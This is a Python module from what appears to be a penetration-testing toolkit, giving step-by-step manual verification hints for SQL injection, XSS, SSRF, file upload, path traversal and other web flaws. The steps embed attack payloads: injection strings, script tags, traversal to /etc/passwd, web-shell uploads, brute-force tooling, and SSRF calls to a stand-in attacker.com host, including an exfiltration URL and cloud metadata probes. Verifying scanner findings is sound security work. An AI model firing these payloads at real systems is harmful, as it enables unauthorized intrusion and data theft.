"""
Manual Verification Hints module for VAPT toolkit.
Provides detailed verification guidance for different vulnerability types.
"""

from typing import Dict, List, Optional
from dataclasses import dataclass
from enum import Enum


@dataclass
class VerificationHint:
    """Represents a single verification hint."""
    title: str
    description: str
    steps: List[str]
    tools: List[str]
    expected_signs: List[str]
    false_positive_indicators: List[str]


class VerificationHints:
    """Generates verification hints for different vulnerability types."""

    @staticmethod
    def get_sql_injection_hints() -> VerificationHint:
        """Get verification hints for SQL Injection vulnerabilities."""
        return VerificationHint(
            title="SQL Injection Verification",
            description="Verify if the application is vulnerable to SQL injection attacks.",
            steps=[
                "1. Locate the vulnerable parameter identified in the scan",
                "2. Try entering a single quote (') and observe the response",
                "3. If the response shows an error or behaves differently, proceed to step 4",
                "4. Try entering: ' OR '1'='1 and observe if it returns more data than expected",
                "5. Try entering: ' AND SLEEP(5)-- and check if the response takes ~5 seconds",
                "6. Use sqlmap: sqlmap -u '<URL>' --data '<PARAMS>' -p '<PARAM>' --dbs",
                "7. Confirm if you can retrieve database names, tables, or sensitive data"
            ],
            tools=[
                "sqlmap - Automated SQL injection detection and exploitation",
                "Burp Suite - Manual testing and payload crafting",
                "OWASP ZAP - Automated SQL injection scanning",
                "curl - Manual request testing"
            ],
            expected_signs=[
                "Database error messages in response",
                "Response time delays (time-based blind SQL injection)",
                "Different response content (boolean-based blind SQL injection)",
                "Successful data extraction via sqlmap",
                "Non-200 HTTP status codes with error details"
            ],
            false_positive_indicators=[
                "The parameter is not actually user-controlled",
                "Input is properly parameterized (prepared statements)",
                "Error messages are generic and don't reveal database structure",
                "Response delays are caused by other factors (network, caching)"
            ]
        )

    @staticmethod
    def get_xss_hints() -> VerificationHint:
        """Get verification hints for Cross-Site Scripting vulnerabilities."""
        return VerificationHint(
            title="Cross-Site Scripting (XSS) Verification",
            description="Verify if the application is vulnerable to XSS attacks.",
            steps=[
                "1. Identify the parameter or field flagged by the scanner",
                "2. Enter a simple payload: <script>alert('XSS')</script>",
                "3. Check if the payload appears in the HTML source or executes",
                "4. If reflected, try: <img src=x onerror=alert('XSS')>",
                "5. For stored XSS, inject the payload and check if it persists after page reload",
                "6. Test DOM-based XSS: try manipulating window.location or DOM properties",
                "7. Use Burp Suite intruder with XSS payloads from PayloadsAllTheThings",
                "8. Check if Content Security Policy (CSP) headers are present and bypass attempts"
            ],
            tools=[
                "Burp Suite - XSS payload testing and manual verification",
                "OWASP ZAP - Automated XSS scanning",
                "PayloadsAllTheThings - Comprehensive XSS payload collection",
                "Browser Developer Tools - DOM inspection and JS execution"
            ],
            expected_signs=[
                "JavaScript code executes in the browser",
                "Alert boxes, console messages, or DOM modifications appear",
                "Payload visible in HTML source without encoding",
                "Ability to steal cookies or session tokens",
                "Ability to perform actions as the logged-in user"
            ],
            false_positive_indicators=[
                "Output is HTML-encoded or properly sanitized",
                "Payload is rejected by the application",
                "Content Security Policy prevents script execution",
                "Input is validated and rejects script tags",
                "JavaScript execution happens only in specific safe contexts"
            ]
        )

    @staticmethod
    def get_csrf_hints() -> VerificationHint:
        """Get verification hints for CSRF vulnerabilities."""
        return VerificationHint(
            title="Cross-Site Request Forgery (CSRF) Verification",
            description="Verify if the application is vulnerable to CSRF attacks.",
            steps=[
                "1. Identify a state-changing action (login, password change, fund transfer)",
                "2. Capture the request using Burp Suite",
                "3. Check if the request includes CSRF tokens in request body or headers",
                "4. If no token, create an HTML form that performs the action",
                "5. Test if the token (if present) is validated on each request",
                "6. Try submitting the same request twice - does the token change?",
                "7. Check if SameSite cookie attribute is set (inspect Set-Cookie headers)",
                "8. Create a test HTML form and host it on a different domain to verify cross-domain requests work"
            ],
            tools=[
                "Burp Suite - CSRF token analysis and form generation",
                "OWASP ZAP - CSRF scanning",
                "curl - Manual request testing",
                "Browser Developer Tools - Cookie inspection"
            ],
            expected_signs=[
                "No CSRF token present in forms or requests",
                "CSRF token is static (doesn't change between requests)",
                "Token is not validated server-side",
                "SameSite cookie attribute is missing or set to None without Secure",
                "State-changing actions can be triggered from cross-domain requests"
            ],
            false_positive_indicators=[
                "CSRF tokens are present and validated",
                "SameSite=Strict or SameSite=Lax is properly set",
                "State-changing requests require GET with no referer or POST with valid token",
                "Application uses custom origin validation headers"
            ]
        )

    @staticmethod
    def get_idor_hints() -> VerificationHint:
        """Get verification hints for Insecure Direct Object Reference vulnerabilities."""
        return VerificationHint(
            title="Insecure Direct Object Reference (IDOR) Verification",
            description="Verify if the application is vulnerable to IDOR attacks.",
            steps=[
                "1. Identify object references (user IDs, document IDs, etc.) in URLs/parameters",
                "2. Log in as User A and capture a request with their object ID",
                "3. Log in as User B and try replacing the ID with User A's ID",
                "4. Check if you can access User A's data without authorization",
                "5. Try sequential IDs (1, 2, 3) to enumerate other users' data",
                "6. Try predictable IDs (uuid format, timestamp-based, etc.)",
                "7. Test with admin tools like Burp Intruder to automate ID enumeration",
                "8. Check if authorization checks are performed before data retrieval"
            ],
            tools=[
                "Burp Suite Intruder - Automated ID enumeration",
                "curl - Manual request testing with different IDs",
                "OWASP ZAP - IDOR scanning",
                "Python/Bash scripts - Batch testing with multiple IDs"
            ],
            expected_signs=[
                "Successful access to other users' data",
                "No 403 Forbidden or 401 Unauthorized responses",
                "Ability to retrieve sequential or enumerated objects",
                "Authorization header/token is not checked on backend"
            ],
            false_positive_indicators=[
                "Access is properly denied with 403 Forbidden",
                "User can only access their own objects",
                "IDs are non-sequential or cryptographically random",
                "Backend validates user ownership before returning data"
            ]
        )

    @staticmethod
    def get_authentication_hints() -> VerificationHint:
        """Get verification hints for Authentication flaws."""
        return VerificationHint(
            title="Authentication Flaw Verification",
            description="Verify authentication bypass or weak authentication mechanisms.",
            steps=[
                "1. Identify the authentication mechanism (login page, API auth, 2FA)",
                "2. Test for hardcoded credentials or default passwords",
                "3. Attempt brute force with common password lists (rockyou.txt, etc.)",
                "4. Check if the application implements account lockout after failed attempts",
                "5. Test for timing attacks: compare response times for valid vs invalid usernames",
                "6. Check if sessions are properly invalidated on logout",
                "7. Test for weak password policies (minimum length, complexity requirements)",
                "8. Try bypassing authentication by removing auth cookies/tokens",
                "9. Check if 2FA can be bypassed by accessing the account endpoint directly"
            ],
            tools=[
                "Burp Suite - Manual auth testing and session analysis",
                "Hydra - Automated password brute forcing",
                "sqlmap - SQL injection in login forms",
                "OWASP ZAP - Authentication scanning"
            ],
            expected_signs=[
                "Successful login with weak or default credentials",
                "No account lockout mechanism",
                "Timing differences between valid and invalid usernames",
                "Session tokens that don't expire",
                "2FA bypass through direct endpoint access"
            ],
            false_positive_indicators=[
                "Strong authentication with proper session management",
                "Account lockout is implemented",
                "No timing differences in responses",
                "Sessions expire appropriately",
                "2FA is properly enforced on all sensitive operations"
            ]
        )

    @staticmethod
    def get_authorization_hints() -> VerificationHint:
        """Get verification hints for Authorization flaws."""
        return VerificationHint(
            title="Authorization Flaw Verification",
            description="Verify if access control is properly enforced.",
            steps=[
                "1. Identify different user roles (admin, user, guest) in the application",
                "2. Log in as a low-privileged user (guest or basic user)",
                "3. Try accessing admin-only endpoints or resources",
                "4. Test horizontal escalation: access resources of other users with same role",
                "5. Test vertical escalation: try accessing higher privilege features",
                "6. Check URL parameters that might indicate roles or permissions",
                "7. Try modifying cookies or tokens to elevate privileges",
                "8. Test direct access to backend API endpoints without proper UI restrictions",
                "9. Check if authorization checks are present on both frontend and backend"
            ],
            tools=[
                "Burp Suite - Request modification and authorization testing",
                "curl - Direct backend endpoint testing",
                "OWASP ZAP - Access control scanning",
                "Browser DevTools - Cookie and token inspection"
            ],
            expected_signs=[
                "Successful access to admin-only features",
                "Horizontal escalation: access to other users' data",
                "Vertical escalation: privilege elevation to admin",
                "Backend allows direct access without frontend restrictions",
                "Authorization tokens can be easily modified"
            ],
            false_positive_indicators=[
                "Only authorized users can access restricted resources",
                "Users cannot access other users' data",
                "Role-based access control is properly implemented",
                "Backend enforces authorization on all endpoints",
                "Tokens are cryptographically signed"
            ]
        )

    @staticmethod
    def get_ssrf_hints() -> VerificationHint:
        """Get verification hints for Server-Side Request Forgery vulnerabilities."""
        return VerificationHint(
            title="Server-Side Request Forgery (SSRF) Verification",
            description="Verify if the application makes uncontrolled requests to external URLs.",
            steps=[
                "1. Identify parameters that accept URLs (image upload, proxy, fetch functionality)",
                "2. Try entering a URL pointing to your controlled server (e.g., http://attacker.com)",
                "3. Check if the server makes a request to your URL (check server logs)",
                "4. Try accessing internal resources: http://localhost:8080, http://169.254.169.254",
                "5. Try accessing cloud metadata endpoints: http://169.254.169.254/latest/meta-data/",
                "6. Use DNS exfiltration: http://attacker.com/flag=ARUNAVA",
                "7. Try port scanning internal network: http://192.168.1.x",
                "8. Check if URL is filtered: try bypasses like http://127.1, http://0x7f.1"
            ],
            tools=[
                "Burp Suite - URL parameter testing",
                "curl - Manual SSRF testing",
                "Webhook.site - Receiving SSRF callback requests",
                "AWS Metadata endpoint checkers"
            ],
            expected_signs=[
                "Server makes requests to your controlled domain",
                "Ability to access internal resources",
                "AWS/cloud metadata is accessible",
                "Port scanning results returned in response",
                "Internal IP addresses are revealed"
            ],
            false_positive_indicators=[
                "URL parameter is not used for making requests",
                "All external URLs are blocked",
                "Internal resources return 403 Forbidden",
                "URL is validated against a whitelist",
                "Server doesn't expose internal network information"
            ]
        )

    @staticmethod
    def get_file_upload_hints() -> VerificationHint:
        """Get verification hints for File Upload vulnerabilities."""
        return VerificationHint(
            title="File Upload Vulnerability Verification",
            description="Verify if uploaded files can be exploited for RCE or other attacks.",
            steps=[
                "1. Identify file upload functionality in the application",
                "2. Upload a test file (text, image) and note where it's stored",
                "3. Try uploading a PHP/JSP/ASPX file and access it through the web",
                "4. If code execution works, verify with a simple command: system('id')",
                "5. Try bypassing file type checks: upload .php as .php5, .php7, .phtml",
                "6. Try uploading files with null bytes: shell.php%00.jpg",
                "7. Try uploading SVG or XML files with embedded scripts",
                "8. Check if the server executes uploaded files or just serves them",
                "9. Try path traversal in filename: ../../../shell.php"
            ],
            tools=[
                "Burp Suite - File upload testing and manipulation",
                "curl - Direct file upload testing",
                "Exiftool - Metadata injection",
                "SVG/XXE payload generators"
            ],
            expected_signs=[
                "Uploaded code file executes on the server",
                "Shell.php file can be accessed and returns command output",
                "No file type validation is performed",
                "Uploaded files are stored in web-accessible directory",
                "File permissions allow execution"
            ],
            false_positive_indicators=[
                "Uploaded files are stored outside web root",
                "Files are not executed, only served as downloads",
                "File type validation is properly enforced",
                "Uploaded files have no execute permissions",
                "File content is properly scanned for malware"
            ]
        )

    @staticmethod
    def get_path_traversal_hints() -> VerificationHint:
        """Get verification hints for Path Traversal vulnerabilities."""
        return VerificationHint(
            title="Path Traversal Verification",
            description="Verify if the application allows accessing files outside intended directories.",
            steps=[
                "1. Identify file parameters (file, path, download, include)",
                "2. Try accessing the current directory: file=./ or file=./index.php",
                "3. Try path traversal with ../ sequences: file=../../etc/passwd",
                "4. Try URL encoding: file=..%2F..%2Fetc%2Fpasswd",
                "5. Try double URL encoding: file=..%252F..%252Fetc%252Fpasswd",
                "6. Try backslash (Windows): file=..\\..\\windows\\win.ini",
                "7. Try null bytes: file=../../etc/passwd%00.jpg",
                "8. Try Unicode encoding or other bypasses",
                "9. Check if sensitive files are readable (passwd, shadow, config files)"
            ],
            tools=[
                "Burp Suite - Path traversal testing",
                "curl - Manual path traversal attempts",
                "fuzzdb - Path traversal wordlists",
                "wfuzz - Automated path traversal fuzzing"
            ],
            expected_signs=[
                "Successfully read /etc/passwd or other system files",
                "Access to application configuration or source code",
                "System information disclosure in responses",
                "Ability to read arbitrary files with server permissions"
            ],
            false_positive_indicators=[
                "Path traversal sequences are stripped or blocked",
                "Files are properly validated against whitelist",
                "Directory permissions prevent unauthorized access",
                "Symbolic links are not followed",
                "Application runs with minimal file system permissions"
            ]
        )

    @staticmethod
    def get_misconfiguration_hints() -> VerificationHint:
        """Get verification hints for Security Misconfiguration."""
        return VerificationHint(
            title="Security Misconfiguration Verification",
            description="Verify common security misconfigurations.",
            steps=[
                "1. Check for common misconfigured endpoints: /admin, /debug, /swagger, /graphql",
                "2. Look for default credentials in documentation or source code",
                "3. Check response headers for version information (Server, X-Powered-By)",
                "4. Try accessing .git, .svn, .env files in web root",
                "5. Check for backup files: .bak, .orig, .swp, .tmp",
                "6. Look for open ports with nmap: nmap -sV -p- <target>",
                "7. Check for misconfigured CORS headers: Access-Control-Allow-Origin: *",
                "8. Test for missing security headers: X-Frame-Options, X-Content-Type-Options",
                "9. Check for verbose error messages revealing system details"
            ],
            tools=[
                "nmap - Port and service discovery",
                "curl - Header and endpoint testing",
                "burpsuite - Comprehensive security analysis",
                "owasp-zap - Automated misconfiguration scanning"
            ],
            expected_signs=[
                "Exposed admin panels or debugging interfaces",
                "Sensitive files accessible in web root",
                "Version information disclosed in headers",
                "Default credentials work on admin interfaces",
                "Missing security headers",
                "Overly permissive CORS configuration"
            ],
            false_positive_indicators=[
                "Admin interfaces are properly protected with authentication",
                "Sensitive files are not in web-accessible directories",
                "No version information in headers",
                "Security headers are properly configured",
                "CORS is restricted to specific origins"
            ]
        )

    @staticmethod
    def get_business_logic_hints() -> VerificationHint:
        """Get verification hints for Business Logic flaws."""
        return VerificationHint(
            title="Business Logic Flaw Verification",
            description="Verify if business logic can be manipulated for unauthorized actions.",
            steps=[
                "1. Understand the application's business workflow (purchase, approval, payment)",
                "2. Test if steps can be skipped or reordered",
                "3. Try manipulating numeric values: price, quantity, discount",
                "4. Test for race conditions: submit the same request multiple times quickly",
                "5. Try bypassing workflow restrictions: order without checkout",
                "6. Test for numeric overflow: use negative values or extremely large numbers",
                "7. Manipulate request parameters to change behavior: bypass approval steps",
                "8. Test duplicate operations: retry completed transactions",
                "9. Look for timing windows where states are inconsistent"
            ],
            tools=[
                "Burp Suite - Request manipulation and repeating",
                "Burp Intruder - Rapid request sending for race conditions",
                "curl - Scripting business logic tests",
                "Python - Complex workflow testing"
            ],
            expected_signs=[
                "Steps in workflow can be skipped or reordered",
                "Unauthorized state transitions are allowed",
                "Numeric values can be manipulated (negative prices, etc.)",
                "Duplicate transactions are processed",
                "Approval steps are bypassed"
            ],
            false_positive_indicators=[
                "Workflow steps are strictly enforced in order",
                "Numeric values are validated (non-negative, in range)",
                "Duplicate detection prevents repeat transactions",
                "Authorization is checked at each workflow step",
                "Race condition mitigations are in place"
            ]
        )

    @staticmethod
    def get_rate_limiting_hints() -> VerificationHint:
        """Get verification hints for Rate Limiting vulnerabilities."""
        return VerificationHint(
            title="Rate Limiting Bypass Verification",
            description="Verify if rate limiting controls are properly implemented.",
            steps=[
                "1. Identify rate-limited endpoints (login, password reset, API calls)",
                "2. Make repeated requests quickly and monitor for rate limit responses",
                "3. Check response headers for rate limit info: X-RateLimit-* headers",
                "4. If rate limited, try bypassing with different IP headers: X-Forwarded-For",
                "5. Try adding parameters that bypass rate limiting: add timestamp, nonce",
                "6. Test if rate limits reset after some time",
                "7. Try from multiple IPs or proxy rotation",
                "8. Check if rate limiting is client-side only (easily bypassable)"
            ],
            tools=[
                "Burp Suite Intruder - Rapid request sending",
                "curl with loops - Automated rate limit testing",
                "ab (Apache Bench) - Load and rate limit testing",
                "wrk - Performance and rate limit testing"
            ],
            expected_signs=[
                "Hundreds of requests processed without 429 Too Many Requests",
                "No X-RateLimit headers in responses",
                "Rate limiting can be bypassed with different source IPs",
                "Brute force attacks succeed without delay",
                "Rate limits only exist on frontend"
            ],
            false_positive_indicators=[
                "Consistent 429 responses after rate limit threshold",
                "X-RateLimit headers properly indicate limits",
                "Rate limiting is enforced server-side by IP/user",
                "Exponential backoff is required after repeated failures",
                "Rate limits properly reset after timeout period"
            ]
        )

    @staticmethod
    def get_hints_for_type(finding_type: str) -> Optional[VerificationHint]:
        """Get hints for a specific vulnerability type."""
        hints_map = {
            "SQL_INJECTION": VerificationHints.get_sql_injection_hints,
            "XSS": VerificationHints.get_xss_hints,
            "CSRF": VerificationHints.get_csrf_hints,
            "IDOR": VerificationHints.get_idor_hints,
            "AUTHENTICATION": VerificationHints.get_authentication_hints,
            "AUTHORIZATION": VerificationHints.get_authorization_hints,
            "SSRF": VerificationHints.get_ssrf_hints,
            "FILE_UPLOAD": VerificationHints.get_file_upload_hints,
            "PATH_TRAVERSAL": VerificationHints.get_path_traversal_hints,
            "MISCONFIGURATION": VerificationHints.get_misconfiguration_hints,
            "BUSINESS_LOGIC": VerificationHints.get_business_logic_hints,
            "RATE_LIMITING": VerificationHints.get_rate_limiting_hints,
        }

        hint_func = hints_map.get(finding_type)
        return hint_func() if hint_func else None

    @staticmethod
    def get_all_hints() -> Dict[str, VerificationHint]:
        """Get all available hints."""
        return {
            "SQL_INJECTION": VerificationHints.get_sql_injection_hints(),
            "XSS": VerificationHints.get_xss_hints(),
            "CSRF": VerificationHints.get_csrf_hints(),
            "IDOR": VerificationHints.get_idor_hints(),
            "AUTHENTICATION": VerificationHints.get_authentication_hints(),
            "AUTHORIZATION": VerificationHints.get_authorization_hints(),
            "SSRF": VerificationHints.get_ssrf_hints(),
            "FILE_UPLOAD": VerificationHints.get_file_upload_hints(),
            "PATH_TRAVERSAL": VerificationHints.get_path_traversal_hints(),
            "MISCONFIGURATION": VerificationHints.get_misconfiguration_hints(),
            "BUSINESS_LOGIC": VerificationHints.get_business_logic_hints(),
            "RATE_LIMITING": VerificationHints.get_rate_limiting_hints(),
        }
